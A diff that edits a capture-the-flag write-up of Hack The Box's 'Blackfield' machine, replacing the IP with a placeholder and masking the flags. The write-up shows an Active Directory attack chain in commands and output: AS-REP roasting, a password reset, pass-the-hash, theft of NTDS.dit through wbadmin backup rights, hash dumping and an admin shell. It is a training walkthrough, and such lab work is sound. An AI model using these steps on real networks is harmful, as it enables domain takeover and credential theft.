@@ -11,8 +11,6 @@ htb_url: https://app.hackthebox.com/machines/Blackfield
 ---
 ## Overview
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/0-blackfield-infocard.png)
-
 Short description to include any strange things to be dealt with
 
 ## Useful Skills and Tools
@@ -29,13 +27,13 @@ Short description to include any strange things to be dealt with
 
 ### Nmap scan
 
-I started my enumeration with an nmap scan of `10.10.10.192`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
+I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 At first my scan wouldn't go through until I added the `-Pn` flag to stop nmap from sending ICMP probes. After that it proceeded normally.
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ nmap -n -v -p- -sCV -oA blackfield 10.10.10.192 -Pn
+└─$ nmap -n -v -p- -sCV -oA blackfield <YOUR_IP> -Pn
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-03 11:28 EDT
 NSE: Loaded 151 scripts for scanning.
 NSE: Script Pre-scanning.
@@ -46,29 +44,29 @@ Completed NSE at 11:28, 0.00s elapsed
 Initiating NSE at 11:28
 Completed NSE at 11:28, 0.00s elapsed
 Initiating Connect Scan at 11:28
-Scanning 10.10.10.192 [65535 ports]
-Discovered open port 135/tcp on 10.10.10.192
-Discovered open port 53/tcp on 10.10.10.192
-Discovered open port 445/tcp on 10.10.10.192
+Scanning <YOUR_IP> [65535 ports]
+Discovered open port 135/tcp on <YOUR_IP>
+Discovered open port 53/tcp on <YOUR_IP>
+Discovered open port 445/tcp on <YOUR_IP>
 Connect Scan Timing: About 19.76% done; ETC: 11:31 (0:02:06 remaining)
-Discovered open port 88/tcp on 10.10.10.192
-Discovered open port 593/tcp on 10.10.10.192
+Discovered open port 88/tcp on <YOUR_IP>
+Discovered open port 593/tcp on <YOUR_IP>
 Connect Scan Timing: About 47.61% done; ETC: 11:30 (0:01:07 remaining)
-Discovered open port 3268/tcp on 10.10.10.192
-Discovered open port 5985/tcp on 10.10.10.192
-Discovered open port 389/tcp on 10.10.10.192
+Discovered open port 3268/tcp on <YOUR_IP>
+Discovered open port 5985/tcp on <YOUR_IP>
+Discovered open port 389/tcp on <YOUR_IP>
 Completed Connect Scan at 11:30, 106.20s elapsed (65535 total ports)
 Initiating Service scan at 11:30
-Scanning 8 services on 10.10.10.192
+Scanning 8 services on <YOUR_IP>
 Completed Service scan at 11:32, 142.44s elapsed (8 services on 1 host)
-NSE: Script scanning 10.10.10.192.
+NSE: Script scanning <YOUR_IP>.
 Initiating NSE at 11:32
 Completed NSE at 11:33, 40.24s elapsed
 Initiating NSE at 11:33
 Completed NSE at 11:33, 1.04s elapsed
 Initiating NSE at 11:33
 Completed NSE at 11:33, 0.01s elapsed
-Nmap scan report for 10.10.10.192
+Nmap scan report for <YOUR_IP>
 Host is up (0.035s latency).
 Not shown: 65527 filtered ports
 PORT     STATE SERVICE       VERSION
@@ -117,16 +115,16 @@ Since port 445 \(SMB\) is open I tried to enumerate open shares by using anonymo
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ crackmapexec smb 10.10.10.192 -u '' --shares
-SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
-SMB         10.10.10.192    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
+└─$ crackmapexec smb <YOUR_IP> -u '' --shares
+SMB         <YOUR_IP>    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         <YOUR_IP>    445    DC01             [-] Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED(The remote user session has been deleted.)
 ```
 
 with crackmapexec was unable to get any shares without a username, but I'm not sure if you can do anonymous login with this program so I tried with the standard smbclient as well
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ smbclient -U "" -L \\\\10.10.10.192\\       
+└─$ smbclient -U "" -L \\\\<YOUR_IP>\\       
 Enter WORKGROUP\'s password: 
 
         Sharename       Type      Comment
@@ -145,7 +143,7 @@ SMB1 disabled -- no workgroup available
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ smbclient -U ""  \\\\10.10.10.192\\forensic
+└─$ smbclient -U ""  \\\\<YOUR_IP>\\forensic
 Enter WORKGROUP\'s password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -156,7 +154,7 @@ I was able to login to the `forensic` share anonymously but was not allowed to d
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ smbclient -U ""  \\\\10.10.10.192\\profiles$
+└─$ smbclient -U ""  \\\\<YOUR_IP>\\profiles$
 Enter WORKGROUP\'s password: 
 Try "help" to get a list of possible commands.
 smb: \> ls
@@ -482,11 +480,11 @@ smb: \> ls
 
 Trying again with the `profiles$` share yielded a lot more information! I took all of the these usernames and added them to a list.
 
-I tried using Metasploit's `auxiliary(gather/kerberos_enumusers)` Kerberos user enumeration tool, however I just got an error for each user saying `[*] 10.10.10.193:88 - Wrong DOMAIN Name? Check DOMAIN and retry...`
+I tried using Metasploit's `auxiliary(gather/kerberos_enumusers)` Kerberos user enumeration tool, however I just got an error for each user saying `[*] <YOUR_IP>:88 - Wrong DOMAIN Name? Check DOMAIN and retry...`
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ rpcclient -U "" -N  10.10.10.192                                                                1 ⨯
+└─$ rpcclient -U "" -N  <YOUR_IP>                                                                1 ⨯
 rpcclient $> enumdomusers
 result was NT_STATUS_ACCESS_DENIED
 rpcclient $> getdcname blackfield
@@ -499,7 +497,7 @@ since the module in msfconsole didn't I decided to try the python-based Impacket
 
 ```text
 ┌──(zweilos㉿kali)-[~/impacket/examples]
-└─$ python3 ./GetNPUsers.py blackfield/ -no-pass -usersfile ~/htb/blackfield/usernames -dc-ip 10.10.10.192 > kerberosEnum
+└─$ python3 ./GetNPUsers.py blackfield/ -no-pass -usersfile ~/htb/blackfield/usernames -dc-ip <YOUR_IP> > kerberosEnum
 
 ┌──(zweilos㉿kali)-[~/impacket/examples]
 └─$ cat kerberosEnum | grep -v UNKNOWN   
@@ -565,19 +563,19 @@ After searching for the correct hash type I fired up hashcat and very quickly cr
 
 ```text
 ┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
-└─$ crackmapexec smb 10.10.10.192 -u support -p '#00^BlackKnight' --shares
-SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
-SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
-SMB         10.10.10.192    445    DC01             [+] Enumerated shares
-SMB         10.10.10.192    445    DC01             Share           Permissions     Remark
-SMB         10.10.10.192    445    DC01             -----           -----------     ------
-SMB         10.10.10.192    445    DC01             ADMIN$                          Remote Admin
-SMB         10.10.10.192    445    DC01             C$                              Default share
-SMB         10.10.10.192    445    DC01             forensic                        Forensic / Audit share.                                                                                                     
-SMB         10.10.10.192    445    DC01             IPC$            READ            Remote IPC
-SMB         10.10.10.192    445    DC01             NETLOGON        READ            Logon server share 
-SMB         10.10.10.192    445    DC01             profiles$       READ            
-SMB         10.10.10.192    445    DC01             SYSVOL          READ            Logon server share
+└─$ crackmapexec smb <YOUR_IP> -u support -p '#00^BlackKnight' --shares
+SMB         <YOUR_IP>    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         <YOUR_IP>    445    DC01             [+] BLACKFIELD.local\support:#00^BlackKnight 
+SMB         <YOUR_IP>    445    DC01             [+] Enumerated shares
+SMB         <YOUR_IP>    445    DC01             Share           Permissions     Remark
+SMB         <YOUR_IP>    445    DC01             -----           -----------     ------
+SMB         <YOUR_IP>    445    DC01             ADMIN$                          Remote Admin
+SMB         <YOUR_IP>    445    DC01             C$                              Default share
+SMB         <YOUR_IP>    445    DC01             forensic                        Forensic / Audit share.                                                                                                     
+SMB         <YOUR_IP>    445    DC01             IPC$            READ            Remote IPC
+SMB         <YOUR_IP>    445    DC01             NETLOGON        READ            Logon server share 
+SMB         <YOUR_IP>    445    DC01             profiles$       READ            
+SMB         <YOUR_IP>    445    DC01             SYSVOL          READ            Logon server share
 ```
 
 The user `support` could view the same shares as I could see anonymously. Next I tried to see if this user could get any more information from them.
@@ -586,14 +584,14 @@ I connected to each of the three shares: `profiles$` still had the same empty us
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -h 10.10.10.192 -s sub -L -b "dc=BLACKFIELD,dc=LOCAL" > blackfield.LDAP
+└─$ ldapsearch -D 'BLACKFIELD\support' -w '#00^BlackKnight' -h <YOUR_IP> -s sub -L -b "dc=BLACKFIELD,dc=LOCAL" > blackfield.LDAP
 ```
 
 I ran `ldapsearch` next to see if I could get any more information than before, and a mountain of data returned. \(I also made the mistake of not sending the output to a file the first time and my screen exploded\). Unfortunately, there was nothing new or useful in all of that the output \(besides a slew of anonymous sounding usernames such as blackfield123456, etc.\)
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -ns 10.10.10.192
+└─$ bloodhound-python -c ALL -u support -p '#00^BlackKnight' -d blackfield.local -ns <YOUR_IP>
 INFO: Found AD domain: blackfield.local
 INFO: Connecting to LDAP server: dc01.blackfield.local
 INFO: Found 1 domains
@@ -637,7 +635,7 @@ This site showed that using rpcclient with the syntax `rpcclient $> setuserinfo2
 
 ```text
 ┌──(zweilos㉿kali)-[/usr/share/neo4j/conf]
-└─$ rpcclient -U BLACKFIELD/support 10.10.10.192
+└─$ rpcclient -U BLACKFIELD/support <YOUR_IP>
 Enter BLACKFIELD\support's password: 
 rpcclient $> enumdomusers
 user:[Administrator] rid:[0x1f4]
@@ -665,7 +663,7 @@ I also tried doing it the 'easy' way with the one-liner from the bottom of the b
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ net rpc password audit2020 -U support -S 10.10.10.192  
+└─$ net rpc password audit2020 -U support -S <YOUR_IP>  
 Enter new password for audit2020:
 Enter WORKGROUP\support's password:
 ```
@@ -674,7 +672,7 @@ now that I had a usable password for another user I set out to see what I could 
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ smbclient -W BLACKFIELD -U "audit2020"  \\\\10.10.10.192\\forensic 'TestPass!23'
+└─$ smbclient -W BLACKFIELD -U "audit2020"  \\\\<YOUR_IP>\\forensic 'TestPass!23'
 Try "help" to get a list of possible commands.
 smb: \> ls
   .                                   D        0  Sun Feb 23 08:03:16 2020
@@ -842,13 +840,13 @@ I tried cracking the NTLM hashes with `hashcat` but even using all of the variou
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ crackmapexec smb 10.10.10.192 -u targets -H hashes -o cme.status   
-SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
-SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
-SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator 9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
-SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\Administrator b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
-SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\svc_backup 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
-SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d
+└─$ crackmapexec smb <YOUR_IP> -u targets -H hashes -o cme.status   
+SMB         <YOUR_IP>    445    DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
+SMB         <YOUR_IP>    445    DC01             [-] BLACKFIELD.local\Administrator 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    DC01             [-] BLACKFIELD.local\Administrator 9658d1d1dcd9250115e2205d9f48400d STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    DC01             [-] BLACKFIELD.local\Administrator b624dc83a27cc29da11d9bf25efea796 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    DC01             [-] BLACKFIELD.local\svc_backup 7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE 
+SMB         <YOUR_IP>    445    DC01             [+] BLACKFIELD.local\svc_backup 9658d1d1dcd9250115e2205d9f48400d
 ```
 
 It didn't take long to find a valid combination. The password \(hash\) for `svc_backup` was `9658d1d1dcd9250115e2205d9f48400d`. Luckily for me, this user is in the Windows Remote Management group, and port 5985 for WinRM was open. I tried using `evil-winRM` and was logged in with a shell.
@@ -859,7 +857,7 @@ It didn't take long to find a valid combination. The password \(hash\) for `svc_
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
+└─$ evil-winrm -i <YOUR_IP> -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d  
 
 Evil-WinRM shell v2.3
 
@@ -873,7 +871,6 @@ USER INFORMATION
 User Name             SID
 ===================== ==============================================
 blackfield\svc_backup S-1-5-21-4194615774-2175524697-3563712290-1413
-
 
 GROUP INFORMATION
 -----------------
@@ -891,7 +888,6 @@ NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandato
 NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288
 
-
 PRIVILEGES INFORMATION
 ----------------------
 
@@ -903,7 +899,6 @@ SeRestorePrivilege            Restore files and directories  Enabled
 SeShutdownPrivilege           Shut down the system           Enabled
 SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
 SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
-
 
 USER CLAIMS INFORMATION
 -----------------------
@@ -921,17 +916,14 @@ Immediately after logging in I knew I had a privilege escalation path. Either of
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> ls
 
-
     Directory: C:\Users\svc_backup\Desktop
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -ar---        10/3/2020   2:56 PM             34 user.txt
 
-
 *Evil-WinRM* PS C:\Users\svc_backup\Desktop> cat user.txt
-5836c825f835143c68398b9e61f56fcf
+****
 ```
 
 ## Path to Power \(Gaining Administrator Access\)
@@ -1023,7 +1015,6 @@ The backup cannot be completed because the backup storage destination is a share
 wbadmin 1.0 - Backup command-line tool
 (C) Copyright Microsoft Corporation. All rights reserved.
 
-
 Note: The backed up data cannot be securely protected at this destination.
 Backups stored on a remote shared folder might be accessible by other
 people on the network. You should only save your backups to a location
@@ -1042,7 +1033,6 @@ Unfortunately it wont' back up to a drive that is not formatted with NTFS, and w
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> wbadmin start backup -quiet -include:C:\Windows\NTDS\NTDS.dit -backuptarget:\\dc01\c$\users\svc_backup\
 wbadmin 1.0 - Backup command-line tool
 (C) Copyright Microsoft Corporation. All rights reserved.
-
 
 Note: The backed up data cannot be securely protected at this destination.
 Backups stored on a remote shared folder might be accessible by other
@@ -1120,7 +1110,6 @@ C:\Windows\Logs\WindowsServerBackup\FileRestore-05-10-2020_09-27-38.log
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> download NTDS.dit
 Info: Downloading C:\Users\svc_backup\Documents\NTDS.dit to NTDS.dit
 
-
 Info: Download successful!
 
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> reg save HKLM\SYSTEM ./
@@ -1142,12 +1131,10 @@ reg.exe : ERROR: Access is denied.
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> download system.hive
 Info: Downloading C:\Users\svc_backup\Documents\system.hive to system.hive
 
-
 Info: Download successful!
 
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> download sam.hive
 Info: Downloading C:\Users\svc_backup\Documents\sam.hive to sam.hive
-
 
 Info: Download successful!
 ```
@@ -1180,7 +1167,7 @@ Using Impacket's `secretsdump.py` I was able to dump the password hashes for all
 
 ```text
 ┌──(zweilos㉿kali)-[~/htb/blackfield]
-└─$ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee                1 ⨯
+└─$ evil-winrm -i <YOUR_IP> -u administrator -H 184fb5e5178480be64824d4cd53b99ee                1 ⨯
 
 Evil-WinRM shell v2.3
 
@@ -1193,7 +1180,6 @@ USER INFORMATION
 User Name                SID
 ======================== =============================================
 blackfield\administrator S-1-5-21-4194615774-2175524697-3563712290-500
-
 
 GROUP INFORMATION
 -----------------
@@ -1214,7 +1200,6 @@ BLACKFIELD\Enterprise Admins                      Group            S-1-5-21-4194
 BLACKFIELD\Denied RODC Password Replication Group Alias            S-1-5-21-4194615774-2175524697-3563712290-572 Mandatory group, Enabled by default, Enabled group, Local Group
 NT AUTHORITY\NTLM Authentication                  Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
 Mandatory Label\High Mandatory Level              Label            S-1-16-12288
-
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -1248,7 +1233,6 @@ SeTimeZonePrivilege                       Change the time zone                  
 SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
 SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
 
-
 USER CLAIMS INFORMATION
 -----------------------
 
@@ -1257,9 +1241,7 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 *Evil-WinRM* PS C:\Users\Administrator\Documents> ls
 
-
     Directory: C:\Users\Administrator\Documents
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -1273,7 +1255,7 @@ Info: Download successful!
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
-c1cbe908dad337d81c58845ccd092e83
+****
 *Evil-WinRM* PS C:\Users\Administrator\Desktop>
 ```
 
@@ -1313,7 +1295,3 @@ Invoke-Command -ComputerName LOCALHOST -ScriptBlock { $command }
 ```
 
 The script `watcher.ps1` is the reason that root.txt was encrypted
-
-Thanks to [`aas`](https://www.hackthebox.eu/home/users/profile/6259) for something interesting or useful about this machine.
-
-If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
